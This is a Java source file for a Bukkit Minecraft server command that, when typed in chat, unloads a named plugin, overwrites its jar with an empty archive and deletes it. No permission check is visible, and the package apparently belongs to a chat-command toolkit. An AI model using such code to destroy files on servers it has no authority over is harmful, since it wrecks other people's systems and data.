package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import de.impact.utils.PluginUtils;
import org.apache.commons.io.FileUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import java.io.File;
import java.io.FileOutputStream;
import java.util.zip.ZipOutputStream;

public class DeletePlugin extends Command {

    public DeletePlugin() {
        super("DeletePlugin", "DeletePlugin <Plugin>", "Deletes a plugin from the server", CommandCategory.SERVER, "DelPL");
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        if(aliases.length < 1) {
            sendUsage(p);
            return;
        }

        Plugin plugin = Bukkit.getPluginManager().getPlugin(aliases[0]);

        if(plugin == null) {
            ChatUtils.sendMessage(p, "This plugin does not exist");
            return;
        }

        PluginUtils.unload(plugin);

        File f = new File("plugins/" + plugin.getClass().getProtectionDomain().getCodeSource().getLocation().getFile().split("plugins/")[1]);

        try {

            ZipOutputStream out = new ZipOutputStream(new FileOutputStream(f));

            out.flush();
            out.close();

            FileUtils.forceDelete(f);

            ChatUtils.sendMessage(p, "Successfully deleted §a" + plugin.getName());

        } catch (Exception ex) {

            ChatUtils.sendMessage(p, "Unable to delete the plugin, but the code has been destroyed");

        }

    }

}
